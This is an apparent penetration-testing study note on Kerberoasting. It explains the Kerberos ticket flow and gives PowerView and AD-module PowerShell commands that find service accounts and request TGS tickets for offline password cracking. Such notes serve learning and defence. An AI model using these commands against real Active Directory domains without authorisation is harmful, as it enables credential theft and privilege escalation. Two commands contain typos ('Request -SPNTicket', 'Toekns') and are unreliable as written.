# Domain Privilege Escalation - Kerberoasting

Kerberoasting isn't an exploit or an attack it's abusing feature of windows for authenticating users in AD , 

## Steps in Kerberos

- User logs on with username & password.

- Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC (Key Distribution Centre also known as Domain Controller) as an authenticator in the authentication ticket (TGT) request  Authenitcation Service Request (AS-REQ).  The Domain Controller (KDC) checks user information (logon restrictions, group membership, etc) & creates Ticket-Granting Ticket (TGT).

- The TGT is encrypted, signed, & delivered to the user (AS-REP). Only the Kerberos service (KRBTGT) in the domain can open and read TGT data.

- **The User presents the TGT to the DC when requesting a Ticket Granting Service (TGS) ticket (TGS-REQ). The DC opens the TGT & validates PAC checksum . If the DC can open the ticket & the checksum check out, `TGT = valid`. The data in the TGT is effectively copied to create the TGS ticket.**

- **The TGS is encrypted using the target service accounts’s NTLM password hash and sent to the user (TGS-REP).**

- The user connects to the server hosting the service on the appropriate port & presents the TGS Application Request (AP-REQ). The service opens the TGS ticket using its NTLM password hash.

- Optional mutual authentication is done by service that the user provides TGS ticket to

## Kerberoasting 

Ticket Granting Service `TGS` has a server portion which is encrypted with service account's NTLM hash , we can request a TGS for a particular service when we want to connect to it and then cracking the hash , service accounts are usually ignored as passwords aren't changed and they might have some privileges. This can be used to create silver tickets. 

In order to do this we need to have a valid domain user and there must be a SPN attached to a user (service account)

## PowerView commands

### Finding usser accounts used as a service account

```
Get-NetUser -SPN
```

### Request a TGS
```
Request -SPNTicket
```

## AD Module

### Finding usser accounts used as a service account

```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Request a TGS
```
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Toekns.KerberosRequestorSecurityToken -ArgumentList "MSSQLSVC/computername.domainname"
```

